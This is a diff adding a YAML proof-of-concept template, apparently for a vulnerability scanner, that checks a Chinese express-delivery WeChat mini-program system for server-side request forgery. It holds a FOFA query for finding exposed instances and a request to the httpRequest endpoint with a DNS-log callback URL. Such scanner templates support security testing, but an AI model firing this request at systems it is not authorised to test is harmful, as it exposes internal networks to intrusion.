@@ -1,0 +1,17 @@
+id: poc-yaml-express-wechat-mps-httprequest-ssrf
+info:
+  name: 快递微信小程序系统 httpRequest SSRF漏洞
+  severity: high
+  tags:
+  - DNSLOG
+  - ssrf
+  finger: 快递微信小程序系统
+  fofa: body="static/default/newwap/lang/js/jquery.localize.min.js"
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+requests:
+- method: GET
+  path: /weixin/index/httpRequest?url=http://{{.domain}}
+  expression: reverse.Verify()
+transport: http
